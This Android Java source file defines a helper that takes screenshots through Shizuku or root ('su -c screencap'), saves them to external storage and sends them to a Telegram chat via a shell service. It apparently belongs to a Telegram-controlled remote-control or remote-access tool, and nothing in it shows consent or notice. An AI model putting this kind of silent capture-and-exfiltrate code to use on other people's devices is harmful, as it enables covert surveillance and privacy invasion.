package com.java.panel;

import android.content.Context;
import android.os.Environment;
import java.io.File;
import java.lang.reflect.Method;

public class ScreenCaptureHelper {

    public static void takeScreenshot(Context context, String chatId) {
        new Thread(() -> {
            try {
                File dir = new File(Environment.getExternalStorageDirectory(), "/panel");
                if (!dir.exists()) dir.mkdirs();

                File imageFile = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
                String path = imageFile.getAbsolutePath();

                boolean success = false;
                
                // Try with Shizuku first
                try {
                    Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
                    Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
                    newProcessMethod.setAccessible(true);
                    Process process = (Process) newProcessMethod.invoke(null, new String[]{"sh", "-c", "screencap -p " + path}, null, null);
                    if (process != null) {
                        process.waitFor();
                        if (imageFile.exists() && imageFile.length() > 0) success = true;
                    }
                } catch (Exception ignored) {}

                // If Shizuku fails, try with Root / shell
                if (!success) {
                    Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p " + path});
                    process.waitFor();
                    if (imageFile.exists() && imageFile.length() > 0) success = true;
                }

                if (success && ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "📸 Screenshot taken, sending to Telegram...");
                    ShellService.instance.sendFileToTelegram(path, chatId);
                } else if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "❌ Could not take screenshot (Shizuku or Root permission required).");
                }
            } catch (Exception e) {
                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "❌ Error: " + e.getMessage());
                }
            }
        }).start();
    }
}
